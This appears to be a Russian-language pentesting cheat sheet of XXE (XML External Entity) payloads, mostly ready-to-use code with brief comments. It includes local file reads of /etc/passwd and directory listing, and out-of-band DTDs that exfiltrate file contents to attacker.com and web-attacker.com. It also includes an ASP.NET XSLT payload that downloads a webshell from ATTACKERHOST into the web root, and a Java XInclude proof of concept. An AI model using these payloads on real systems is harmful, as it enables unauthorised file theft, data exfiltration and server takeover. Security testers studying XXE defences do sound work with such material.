# Examples XXE

## Basic

1 Можем использовать объявленную сущность в теле XML (здесь через &)

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://evil.com/xxe"> ]>
<root>
    <data>&xxe;</data>
</root>
```

2 Можем использовать объявленную сущность как определение следующей сущности в Doctype (здесь через %).

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://evil.com/xxe"> %xxe; ]>
<root></root>
```

## Include local file

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<root>
    <data>&xxe;</data>
</root>
```

Некоторые парсеры позволяют листить директории:&#x20;

```markup
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///Users/"> ]>
```

## http request

```markup
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://example.com/test"> %ext;
]>
<r></r>
```

```markup
<?xml version="1.0" ?>
<!DOCTYPE foo [
<!ENTITY % payload SYSTEM "file:///etc/">
<!ENTITY % dtd SYSTEM "ftp://example.com/poc2.txt">
%dtd;
%release;
]><foo>ehlo</foo>
```

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test SYSTEM "https://yandexsjknvdkjsdnvkjnskjvnskjd.ru/xxe">
```

## OOB+XXE

Эта техника (OOB - Out-of-Band) используется для отправки результата чтения локального файла

У себя (на attacker.com) раполагаем evil.dtd

```markup
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?collect=%file;'>">
%all;
```

Отправляем уязвимому веб-приложению

```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>
```

TODO: переделать в oob на ftp сервер. Это полезно в том случае, если выводимый файл содержит переносы строк (тк они бьют http запрос)

### С PortSwigger

### 1 OOB -> External Server

Полезная нагрузка (malicious.dtd)

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

На уязвимом сервере

```markup
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

### 2 OOB via Error

Полезная нагрузка (malicious.dtd)

```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

На уязвимом сервере

```markup
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

## XXE -> RCE

на php просто, есть примеры в инете

на ASP.Net такой пэйлоад видел в статье — [https://blog.zsec.uk/out-of-band-xxe-2/amp/](https://blog.zsec.uk/out-of-band-xxe-2/amp/), на проекте не взлетел:

```markup
<?xml version='1.0'?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="http://VICTIM.COM/pwned">
<msxsl:script language="C#" implements-prefix="user">
<![CDATA[
public string xml()
{
    System.Net.WebClient webClient = new System.Net.WebClient();
    webClient.DownloadFile("https://ATTACKERHOST/webshell.aspx",
                       @"c:\inetpub\wwwroot\zephrShell.aspx");

    return "Shell Uploaded Successfully @ /zephrShell.aspx";
}
]]>
</msxsl:script>
<xsl:template match="/">
<xsl:value-of select="user:xml()"/>
</xsl:template>
</xsl:stylesheet>
```

## XInclude

```markup
<?xml version='1.0' encoding="UTF-8"?>
<document xmlns:xi="http://www.w3.org/2001/XInclude">
  <p>Текст моего документа</p>
  <xi:include text="parse" href="copyright.xml"/>
</document>
```

Java PoC

```java
package com.company;

import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;

import org.xml.sax.Attributes;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

public class Main {

    public static void test() {
        final String fileName = "test.xml";

        /* test.xml
        <Document xmlns="urn:iso:std:iso:20022:tech:xsd:pain.001.001.03" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xi="http://www.w3.org/2001/XInclude">
            <PHONEBOOK>
                <PERSON>
                    <NAME>
                        <MAIN_NAME>Noname person</MAIN_NAME>Joe Wang
                    </NAME>
                    <Nm xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="https://example.com" /></Nm>
                </PERSON>
            </PHONEBOOK>
        </Document>
        */

        try {
            SAXParserFactory factory = SAXParserFactory.newInstance();
            factory.setXIncludeAware(true);  // без этого не будет работать !!!
            factory.setNamespaceAware(true); // без этого не будет работать !!!
            factory.setFeature("http://apache.org/xml/features/xinclude", true); // без этого не будет работать !!!
            SAXParser saxParser = factory.newSAXParser();

            DefaultHandler handler = new DefaultHandler() {
                boolean name = false;
                // Метод вызывается когда SAXParser "натыкается" на начало тэга
                @Override
                public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
                    // Если тэг имеет имя NAME, то мы этот момент отмечаем - начался тэг NAME
                    if (qName.equalsIgnoreCase("Nm")) {
                        name = true;
                    }
                }

                // Метод вызывается когда SAXParser считывает текст между тэгами
                @Override
                public void characters(char ch[], int start, int length) throws SAXException {
                    // Если перед этим мы отметили, что имя тэга NAME - значит нам надо текст использовать.
                    if (name) {
                        System.out.println("Name: " + new String(ch, start, length));
                        name = false;
                    }
                }
            };

            // Стартуем разбор методом parse, которому передаем наследника от DefaultHandler, который будет вызываться в нужные моменты
            saxParser.parse(fileName, handler);
            System.out.println("Test");
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
	// write your code here
        test();
        System.out.println("Test");
    }
}

```
